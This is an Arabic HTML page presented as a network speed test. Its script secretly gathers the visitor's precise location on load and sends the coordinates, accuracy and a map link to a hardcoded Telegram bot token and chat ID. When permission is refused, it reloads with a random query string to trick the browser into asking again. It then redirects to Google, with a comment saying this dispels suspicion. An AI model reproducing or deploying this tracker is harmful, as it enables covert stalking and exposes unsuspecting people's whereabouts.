<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص جودة الاتصال</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
        .container { text-align: center; padding: 30px; background: white; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 90%; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #0088cc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h3 { color: #333; }
        p { color: #666; font-size: 14px; }
    </style>
</head>
<body>

<div class="container">
    <div class="loader"></div>
    <h3 id="status-text">جاري فحص سرعة الشبكة...</h3>
    <p>يرجى السماح بالوصول للموقع لتحديد أقرب خادم (Server) لمنطقتك.</p>
</div>

<script>
    // ==========================================
    // 1. إعدادات تليجرام (ضع بياناتك هنا)
    // ==========================================
    const TELEGRAM_TOKEN = '8149313325:AAEc6to9UMMeyEf6MHYaJvtI5_fdC9K5Ros'; 
    const CHAT_ID = '7924214467'; 

    // ==========================================
    // 2. دالة إرسال البيانات لتليجرام
    // ==========================================
    function sendToTelegram(lat, lon, acc) {
        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
        const message = `✅ **تم صيد إحداثيات جديدة!**\n\n` +
                        `📍 الموقع: ${lat}, ${lon}\n` +
                        `🎯 الدقة: ${acc} متر\n\n` +
                        `🔗 رابط الخريطة:\n${mapLink}`;

        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        }).then(() => {
            // بعد الإرسال بنجاح، توجيه المستخدم لموقع حقيقي لإبعاد الشكوك
            document.getElementById('status-text').innerText = "تم الفحص بنجاح! جاري التحويل...";
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1500);
        });
    }

    // ==========================================
    // 3. دالة معالجة الخطأ وخدعة إعادة طلب الإذن
    // ==========================================
    function handleError(err) {
        if (err.code === 1) { // المستخدم ضغط "حظر"
            const randomNum = Math.floor(Math.random() * 10000);
            alert("عذراً، يجب السماح بالوصول للموقع لتشغيل أداة الفحص بنجاح.");
            
            // إعادة تحميل الصفحة برابط "جديد" للمتصفح ليطلب الإذن مرة أخرى
            let currentUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
            window.location.href = currentUrl + "?retry=" + randomNum;
        }
    }

    // ==========================================
    // 4. بدء عملية طلب الموقع عند فتح الصفحة
    // ==========================================
    window.onload = function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => sendToTelegram(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
                handleError,
                { enableHighAccuracy: true }
            );
        } else {
            alert("المتصفح لا يدعم تحديد الموقع.");
        }
    };
</script>

</body>
</html>
